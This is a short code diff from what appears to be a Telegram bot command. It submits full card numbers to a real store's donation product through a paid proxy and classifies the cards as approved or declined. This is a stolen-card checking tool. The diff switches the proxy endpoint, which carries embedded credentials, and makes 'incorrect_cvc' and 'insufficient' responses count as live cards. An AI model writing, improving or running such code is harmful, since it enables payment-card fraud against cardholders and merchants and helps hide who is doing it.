@@ -79,7 +79,7 @@ async def cmd_sf(client, message):
                 "card": fullcc,
                 "product_url": "https://wcbbstore.com/products/donate?variant=40108999835747",
                 "email": None,
-                "proxy": "proxy.rampageproxies.com:5000:package-1111111-country-us-city-bloomington-region-indiana:5671nuWwEPrHCw2t",
+                "proxy": "proxy.speedproxies.net:12321:Indexui184a999e:4fba9e5235e8_country-us",
                 "ship_address": None,
                 "is_shippable": False
             }
@@ -91,7 +91,7 @@ async def cmd_sf(client, message):
                 response = res.json()
                 msg_raw = response.get("message") or response.get("error") or "No response"
                 msg_check = msg_raw.lower()
-                card_status = "approved" if any(x in msg_check for x in ["processedreceipt", "zip", "avs", "charged"]) else "declined"
+                card_status = "approved" if any(x in msg_check for x in ["processedreceipt", "zip", "avs", "incorrect_cvc", "insufficient", "charged"]) else "declined"
                 card_message = msg_raw
         except Exception as e:
             card_status = "error"
